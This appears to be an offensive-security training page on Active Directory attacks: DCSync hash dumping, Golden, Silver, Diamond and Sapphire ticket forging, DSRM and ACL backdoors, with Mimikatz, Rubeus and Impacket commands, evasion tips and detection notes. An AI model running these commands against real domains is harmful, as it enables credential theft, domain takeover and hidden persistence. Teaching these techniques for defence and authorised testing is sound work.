---
layout: training-page
title: "DCSync & Golden Ticket — Red Team Academy"
module: "Active Directory"
tags:
  - dcsync
  - golden-ticket
  - persistence
  - mimikatz
page_key: "ad-dcsync"
render_with_liquid: false
---

# DCSync & Golden Ticket

## DCSync — Replicating the Domain

DCSync abuses the AD replication protocol (MS-DRSR). Domain controllers use replication to sync password changes — an attacker with **Replicating Directory Changes** and **Replicating Directory Changes All** permissions can pretend to be a DC and request any account's password hash directly from a real DC. No need to run code on the domain controller itself.

By default, only Domain Admins, Enterprise Admins, and Domain Controllers have these rights. Backdooring a user with these rights (WriteDACL on the domain head) is a stealthy persistence method.

![DCSync attack flow: attacker with replication rights requests all domain hashes from domain controller](/images/active-directory/dcsync-flow.svg)  
*// dcsync attack flow — impersonate DC to pull all domain hashes*

## Requirements for DCSync

- **Replicating Directory Changes** (DS-Replication-Get-Changes) on the domain object
- **Replicating Directory Changes All** (DS-Replication-Get-Changes-All) on the domain object
- Both rights are needed — either alone is insufficient
- Domain Admins have these by default; DA access = DCSync access

## DCSync — Impacket secretsdump.py

```
# Dump all domain hashes (NTDS.dit) remotely — fastest method:
secretsdump.py 'north.sevenkingdoms.local/Administrator:password@192.168.56.10'

# With NTLM hash (Pass-the-Hash):
secretsdump.py -hashes ':NTLM_HASH' 'north.sevenkingdoms.local/Administrator@192.168.56.10'

# Dump only NTLM hashes (skip Kerberos keys, cleartext):
secretsdump.py 'north.sevenkingdoms.local/Administrator:password@192.168.56.10' \
  -just-dc-ntlm

# Dump specific user (e.g., krbtgt for Golden Ticket):
secretsdump.py 'north.sevenkingdoms.local/Administrator:password@192.168.56.10' \
  -just-dc-user krbtgt

# Dump specific user + NTLM:
secretsdump.py 'north.sevenkingdoms.local/Administrator:password@192.168.56.10' \
  -just-dc-user 'north.sevenkingdoms.local\krbtgt' \
  -just-dc-ntlm

# Output format:
# north.sevenkingdoms.local\Administrator:500:aad3b435...:NTLM_HASH:::
# north.sevenkingdoms.local\krbtgt:502:aad3b435...:KRBTGT_HASH:::
#                                  ^RID ^LM_HASH   ^NTLM_HASH

# Also dumps:
# - Kerberos AES128/AES256 keys
# - NTDS history (previous password hashes)
```

## DCSync — Mimikatz

```
# From a Windows machine with DA privileges (or replication rights):
# Run mimikatz as administrator

# Dump single user's hash:
lsadump::dcsync /user:administrator
lsadump::dcsync /domain:north.sevenkingdoms.local /user:north\krbtgt

# Dump all accounts (verbose — generates large output):
lsadump::dcsync /domain:north.sevenkingdoms.local /all /csv

# Output includes:
# Hash NTLM: [NTLM_HASH]
# Hash SHA1: [SHA1_HASH]
# aes256_hmac: [AES256_KEY]
# aes128_hmac: [AES128_KEY]

# Get krbtgt hash specifically (needed for Golden Ticket):
lsadump::dcsync /domain:north.sevenkingdoms.local /user:north\krbtgt
```

## Granting DCSync Rights (Persistence Backdoor)

```
# If you have WriteDACL on the domain root object — grant DCSync rights:
# PowerView:
$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('NORTH\user', $SecPassword)

Add-DomainObjectAcl -TargetIdentity "DC=north,DC=sevenkingdoms,DC=local" \
  -PrincipalIdentity backdoor_user \
  -Rights DCSync \
  -Credential $Cred

# Verify:
Get-DomainObjectAcl -DistinguishedName "DC=north,DC=sevenkingdoms,DC=local" \
  -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match 'backdoor_SID'}
```

## Golden Ticket

A Golden Ticket is a forged Kerberos TGT (Ticket-Granting Ticket) signed with the krbtgt account's NTLM hash. Since the krbtgt key validates all TGTs in the domain, a Golden Ticket grants access to any resource in the domain as any user — for up to 10 years by default. It persists even after password resets of regular accounts. Only rotating the krbtgt password (twice) invalidates existing Golden Tickets.

### Collecting What You Need

```
># You need 4 things for a Golden Ticket:
# 1. Domain name:    north.sevenkingdoms.local
# 2. Domain SID:     S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
# 3. krbtgt hash:    (from DCSync above)
# 4. Target user:    Administrator (or any username you want — even non-existent)

# Get domain SID (PowerShell):
Get-ADDomain | Select-Object DomainSID

# Or:
(Get-ADUser Administrator).SID.Value
# Remove the last section (-500) to get domain SID

# Or from mimikatz after DCSync:
# krbtgt dump output includes SID in the output

# Get domain SID with Impacket (extract from secretsdump output):
# S-1-5-21-XXX-XXX-XXX = everything before the last RID
```

### Creating the Golden Ticket — Mimikatz

```
# Mimikatz — create and inject Golden Ticket:
kerberos::golden /user:Administrator \
  /domain:north.sevenkingdoms.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_NTLM_HASH \
  /id:500 \
  /ptt

# Parameters:
# /user    — Any username (real or fake — the ticket is forged)
# /domain  — Full domain name
# /sid     — Domain SID (without the RID suffix)
# /krbtgt  — krbtgt NTLM hash (from DCSync)
# /id      — RID (500 = Administrator)
# /ptt     — Pass-the-Ticket: inject into current session
# /ticket  — Save to file instead: /ticket:golden.kirbi

# Verify ticket loaded:
klist

# Use the ticket — access any DC share:
dir \\dc02.north.sevenkingdoms.local\C$
psexec \\dc02.north.sevenkingdoms.local cmd
```

### Creating Golden Ticket — Rubeus

```
# Rubeus — create Golden Ticket with AES256 (stealthier):
Rubeus.exe golden /aes256:AES256_KEY \
  /user:Administrator \
  /domain:north.sevenkingdoms.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /ptt

# With RC4 (NTLM hash):
Rubeus.exe golden /rc4:KRBTGT_NTLM_HASH \
  /user:Administrator \
  /domain:north.sevenkingdoms.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /ptt
```

## Silver Ticket

A Silver Ticket forges a TGS (service ticket) using a *service account's* hash instead of krbtgt. It's more limited than a Golden Ticket (only valid for that specific service) but is stealthier — the DC is never contacted when using it.

```
# Silver Ticket — forged TGS for a specific service:
# Example: forge CIFS service ticket on castelblack using its machine account hash

# Get machine account hash (from secretsdump output):
# CASTELBLACK$:1000:aad3b435...:MACHINE_ACCOUNT_HASH:::

# Create Silver Ticket — CIFS on castelblack:
kerberos::golden /user:Administrator \
  /domain:north.sevenkingdoms.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /target:castelblack.north.sevenkingdoms.local \
  /service:cifs \
  /rc4:MACHINE_ACCOUNT_HASH \
  /ptt

# Common service SPNs for Silver Tickets:
# cifs      — SMB / file shares
# host      — WMI, WinRM, remote shell
# http      — IIS, WinRM over HTTP
# ldap      — LDAP queries
# mssql     — SQL Server (MSSQL)
# rpcss     — Remote Procedure Calls

# Silver Ticket advantage:
# - Does NOT touch the DC during usage (no TGS request logged)
# - Event ID 4627 may appear on target, but not on DC
```

## DCSync + Golden Ticket — Full Domain Ownership Chain

```
># 1. Achieve Domain Admin (via Kerberoasting, PtH, ACL abuse, etc.)
# 2. DCSync krbtgt hash:
secretsdump.py 'north.sevenkingdoms.local/Administrator:pass@192.168.56.10' \
  -just-dc-user krbtgt -just-dc-ntlm

# 3. Get domain SID:
Get-ADDomain | Select DomainSID

# 4. Create Golden Ticket (valid for 10 years by default):
kerberos::golden /user:Administrator \
  /domain:north.sevenkingdoms.local \
  /sid:S-1-5-21-... \
  /krbtgt:KRBTGT_HASH \
  /ptt

# 5. Verify — access any DC resource:
dir \\dc02.north.sevenkingdoms.local\C$

# Even if the Administrator password changes — the Golden Ticket still works.
# Only krbtgt password rotation (twice) invalidates it.
```

## Detection

- **Event ID 4662** — Object accessed with DS-Replication GUIDs. DCSync generates this on the DC being replicated from.
- **Event ID 4769** — TGS request with unusual encryption (RC4 for Golden Ticket vs AES for legitimate tickets).
- **Golden Ticket detection:** Ticket lifetime > 10 hours, or ticket for a non-existent user, triggers alerts in advanced SIEM rules.
- **OPSEC:** Use AES256 for Golden Tickets (`/aes256:`) — RC4 is suspicious in modern environments. Mimic real ticket lifetimes.

## Diamond Ticket

A Diamond Ticket is a stealthier evolution of the Golden Ticket. It starts with a legitimate AS-REQ to the DC, then modifies the PAC in the received TGT rather than forging one from scratch. All timestamps are genuine, making it harder to detect than a classic Golden Ticket.

```
# Diamond Ticket via Rubeus (requires krbtgt AES key or NTLM hash):
# /user: a legitimate low-priv account with known password
# /groups: RIDs to inject (512=Domain Admins, 519=Enterprise Admins)
Rubeus.exe diamond /user:lowprivuser /password:Password1 /dc:dc01.corp.local /enctype:aes /krbkey:KRBTGT_AES256_KEY /groups:512,519 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# Verify ticket loaded:
klist

# Access DC resources:
dir \\dc01.corp.local\C$
```

## Sapphire Ticket

A Sapphire Ticket is the stealthiest Kerberos ticket forging technique. Like the Diamond Ticket, it starts with a legitimate TGT from the KDC. But instead of modifying the PAC directly, the attacker uses the S4U2Self+U2U trick to obtain a valid PAC for any user, then injects that PAC into their own ticket. The PAC is fully legitimate (signed by the KDC, correct PAC_INFO_BUFFER, proper checksums) — making it effectively undetectable by PAC validation.

```
# Sapphire Ticket requires:
# 1. krbtgt AES256 key (from DCSync)
# 2. A valid low-privilege domain account
# 3. The target user's SID (the user you want to impersonate)

# Sapphire Ticket via Rubeus
# Step 1: Get a legitimate TGT for your low-priv user
Rubeus.exe asktgt /user:lowprivuser /password:Password1 /domain:corp.local /dc:dc01.corp.local /enctype:aes256

# Step 2: Use S4U2Self+U2U to obtain a legitimate PAC for the target user
# Then replace the PAC in your TGT with the obtained PAC
Rubeus.exe diamond /user:lowprivuser /password:Password1 /dc:dc01.corp.local /enctype:aes /krbkey:KRBTGT_AES256_KEY /ticketuser:Administrator /ticketuserid:500 /groups:512,519 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# Impacket ticketer with Sapphire Ticket approach
ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-... -domain corp.local -spn krbtgt/corp.local -user-id 500 Administrator

# Verify
klist
dir \\dc01.corp.local\C$
```

```
# Ticket comparison — stealth level:
#
# Golden Ticket:
#   - Forged entirely offline — no AS-REQ to KDC
#   - PAC constructed by attacker — checksums may mismatch
#   - Ticket lifetime/timestamps are fake
#   - Detectable: TGT without prior AS-REQ in KDC logs
#
# Diamond Ticket:
#   - Legitimate AS-REQ → modify PAC in received TGT
#   - Real timestamps, real ticket metadata
#   - PAC is modified but re-signed with krbtgt key
#   - Detectable: PAC modification (if PAC_INFO_BUFFER is analyzed)
#
# Sapphire Ticket:
#   - Legitimate AS-REQ → obtain real PAC via S4U2Self+U2U
#   - PAC is genuine (signed by KDC, not modified)
#   - All timestamps, checksums, and PAC data are KDC-generated
#   - Detection: extremely difficult — requires correlation of
#     S4U2Self requests with ticket usage patterns
```

## DSRM Abuse

Every Domain Controller has a local DSRM (Directory Services Restore Mode) Administrator account. Its hash can be extracted and the account configured to allow network logons — creating a persistent local admin backdoor on the DC independent of domain credentials.

```
# Step 1: Extract DSRM account hash from DC (run on DC with admin):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dc01

# Step 2: Enable network logon for DSRM account on the DC:
# DsrmAdminLogonBehavior = 2 → always allow network logon (even when AD service is running)
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Step 3: Pass-the-hash with DSRM account (use DC hostname — NOT domain — as /domain):
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dc01 /user:Administrator /ntlm:DSRM_NTLM_HASH /run:powershell.exe"'

# Or with Impacket (remote):
secretsdump.py dc01/Administrator@DC_IP -hashes :DSRM_NTLM_HASH
```

## Additional Mimikatz Credential Extraction Commands

Beyond the core DCSync workflow, several Mimikatz modules are useful for extracting credentials and Kerberos keys from live systems and domain controllers.

```
# --- sekurlsa module — extract from LSASS memory ---
# Dump Kerberos encryption keys (AES256, AES128, RC4/NTLM) — needed for AES-based attacks:
sekurlsa::ekeys

# Export all Kerberos tickets from memory to .kirbi files:
sekurlsa::tickets /export

# Invoke-Mimikatz equivalents:
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# --- lsadump module — dump from SAM/LSA/DC ---
# Dump all hashes directly from DC LSASS (requires DA on DC — patches lsass):
# Note: lsadump::dcsync is preferred; lsadump::lsa /patch is noisier but useful on older DCs
lsadump::lsa /patch

# Using Invoke-Mimikatz remotely on DC:
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc

# Dump local SAM database (local account hashes):
lsadump::sam

# Dump LSA secrets (service account passwords, cached creds):
lsadump::secrets

# --- lsadump::trust — extract inter-domain trust keys ---
# Trust keys are used to sign cross-domain tickets (TGTs).
# If you have DA in a child domain, extracting trust keys allows forging
# inter-realm tickets (SID History injection → Enterprise Admin in parent domain).
lsadump::trust /patch

# Using DCSync to get trust account credentials:
lsadump::dcsync /domain:dollarcorp.moneycorp.local /user:MONEYCORP$   # parent domain trust account

# Invoke-Mimikatz remotely:
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc

# After extracting trust keys — forge inter-realm Golden Ticket:
# kerberos::golden /user:Administrator /domain:child.domain.local /sid:CHILD_SID
#   /sids:PARENT_ENTERPRISE_ADMINS_SID /krbtgt:CHILD_KRBTGT_HASH /ptt
```

## Key Resources

- `https://github.com/gentilkiwi/mimikatz` — Mimikatz
- `https://github.com/SecureAuthCorp/impacket` — Impacket (secretsdump.py)
- `https://adsecurity.org/?p=1640` — Sean Metcalf — DCSync Attack explanation
- `https://adsecurity.org/?p=1640` — Golden Ticket internals

## DCSync — Prevention and Detection

DCSync abuses legitimate AD replication — it cannot be disabled out-of-the-box. Prevention requires an RPC firewall (e.g., zero networks rpcfirewall) to allow replication only from actual DCs. Detection is reliable: Event ID **4662** with properties `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` or `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` generated by a non-DC account is a clear indicator. Whitelist Azure AD Connect if present.

```
# Check who has DCSync rights on the domain object:
$sid = "S-1-5-21-DOMAIN-SID-HERE"
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs |
  Where-Object {$_.ObjectAceType -match 'Replication-Get'} |
  Select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType

# Impacket secretsdump — also dumps cleartext if reversible encryption is set:
secretsdump.py -just-dc DOMAIN/user:pass@DC_IP
# -just-dc: dump NTLM hashes + Kerberos keys
# -just-dc-ntlm: only NTLM hashes
# -just-dc-user krbtgt: single user

# Check for accounts with reversible encryption (cleartext stored):
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

## Golden Ticket from Linux — ticketer.py

Impacket's ticketer.py forges Golden Tickets on Linux. You need the krbtgt NTLM hash, the domain SID, the domain name, and a username to impersonate. Use lookupsid.py to enumerate the domain SID if you don't already have it.

```
# Get the domain SID using lookupsid.py:
lookupsid.py inlanefreight.local/pixis:p4ssw0rd@10.129.1.207 | grep "Domain SID"
# → S-1-5-21-2974783224-3764228556-2640795941

# Get krbtgt NTLM hash via DCSync (secretsdump or mimikatz):
secretsdump.py 'inlanefreight.local/Administrator:password@10.129.1.207' \
  -just-dc-user krbtgt -just-dc-ntlm
# → krbtgt:502:aad3b435...:810d754e118439bab1e1d13216150299:::

# Forge Golden Ticket with ticketer.py:
ticketer.py \
  -nthash 810d754e118439bab1e1d13216150299 \
  -domain-sid S-1-5-21-2974783224-3764228556-2640795941 \
  -domain inlanefreight.local \
  Administrator
# Saves ticket as Administrator.ccache

# Use the Golden Ticket:
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass inlanefreight.local/administrator@dc01.inlanefreight.local
# Or WinRM:
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

# Forge for a non-existent user (shows lack of monitoring):
ticketer.py \
  -nthash 810d754e118439bab1e1d13216150299 \
  -domain-sid S-1-5-21-2974783224-3764228556-2640795941 \
  -domain inlanefreight.local \
  ghost_user
export KRB5CCNAME=./ghost_user.ccache
wmiexec.py -k -no-pass inlanefreight.local/ghost_user@dc01.inlanefreight.local
```

## Silver Ticket from Linux — ticketer.py with -spn

Silver Tickets are forged TGS (service tickets) using the service account's NTLM hash. Created entirely offline — the DC is never contacted during ticket creation or use. More stealthy than Golden Tickets for targeted service access.

```
# Silver Ticket requires:
# 1. Service account NTLM hash (from secretsdump output — the machine account or service account)
# 2. Domain SID
# 3. SPN of the target service
# 4. Username to forge into the ticket

# Get machine account hash (e.g., for CIFS on DC01):
secretsdump.py 'inlanefreight.local/Administrator:password@10.129.1.207' \
  -just-dc-user 'DC01$' -just-dc-ntlm
# → DC01$::aad3b435...:MACHINE_ACCOUNT_HASH:::

# Forge Silver Ticket for CIFS service on DC01:
ticketer.py \
  -nthash MACHINE_ACCOUNT_HASH \
  -domain-sid S-1-5-21-2974783224-3764228556-2640795941 \
  -domain inlanefreight.local \
  -spn cifs/dc01.inlanefreight.local \
  Administrator
# Saves ticket as Administrator.ccache

# Use the Silver Ticket:
export KRB5CCNAME=./Administrator.ccache
smbclient.py -k -no-pass //dc01.inlanefreight.local/c$
# Or secretsdump:
secretsdump.py -k -no-pass dc01.inlanefreight.local

# Forge Silver Ticket for LDAP (allows LDAP queries as Administrator):
ticketer.py \
  -nthash MACHINE_ACCOUNT_HASH \
  -domain-sid S-1-5-21-2974783224-3764228556-2640795941 \
  -domain inlanefreight.local \
  -spn ldap/dc01.inlanefreight.local \
  Administrator

# Common SPNs for Silver Tickets:
# cifs/hostname     → SMB / file shares
# http/hostname     → IIS / WinRM over HTTP
# ldap/hostname     → LDAP queries / DCSync
# mssql/hostname    → SQL Server access
# host/hostname     → WMI, task scheduler, WinRM
```

## DC Compromise via DCSync — NetExec and Impacket

Once you identify a user with DCSync permissions (Replicating Directory Changes + All), use Impacket's secretsdump to pull all domain hashes remotely. NetExec can validate credentials and test for DCSync rights before running the full dump.

```
# Validate credentials for multiple users at once:
netexec ldap 172.16.1.15 -u websec mobilesec -p spongebob --continue-on-success
# [+] child.htb.local\websec:spongebob
# [+] child.htb.local\mobilesec:spongebob

# Check DCSync rights (via BloodHound or manually with PowerView):
# Get-DomainObjectAcl -DistinguishedName "DC=..." | Where-Object {ObjectAceType -match "Replication"}

# Remote DCSync with secretsdump — dump all domain hashes:
secretsdump.py -just-dc mobilesec:spongebob@172.16.1.15
# Via proxychains if pivoting through SOCKS:
proxychains secretsdump.py -just-dc mobilesec:spongebob@172.16.1.15 | grep -i domain.name

# Output format: domain\user:RID:LM:NTLM:::
# e.g., child.htb.local\krbtgt:502:aad3b435...:ec3e7210e3f08666...:::

# Use Administrator's NTLM hash to get a TGT (for Kerberos access):
getTGT.py child.htb.local/Administrator -hashes :ADMIN_NTLM_HASH -dc-ip 172.16.1.15
export KRB5CCNAME=./Administrator.ccache
wmiexec.py -k -no-pass dc01.child.htb.local

# Grant DCSync rights to a backdoor user (if you have WriteDACL on domain):
# Using SharpView/PowerView equivalent:
# Add-DomainObjectAcl -PrincipalIdentity svc_sql -Rights DCSync
# After granting rights — verify and run secretsdump as the backdoored account
```

## Golden Ticket — Prevention and Detection

Golden Ticket attacks are hard to prevent once the krbtgt hash is obtained. Key mitigations: block privileged users from authenticating to arbitrary devices, and rotate the krbtgt password twice (at least 10 hours apart) after any domain compromise. Use Microsoft's KrbtgtKeys.ps1 script for safe rotation. Detection: Ticket lifetimes > 10 hours (default is 10h), or event 4769 (TGS request) without a prior 4768 (TGT request) from the same host, or SID filtering alerts (event 4675) in cross-domain scenarios.

```
># Mimikatz Golden Ticket creation (with short lifetime to avoid detection):
# /renewmax: max days ticket can be renewed
# /endin: ticket expiry (in minutes)
kerberos::golden /domain:eagle.local /sid:S-1-5-21-... /rc4:KRBTGT_HASH \
  /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

# Verify ticket in current session:
klist

# Rotate krbtgt password twice to invalidate all existing Golden Tickets:
# Use: https://github.com/microsoft/New-KrbtgtKeys.ps1
# The script has an audit mode — run that first to check for potential disruptions
```
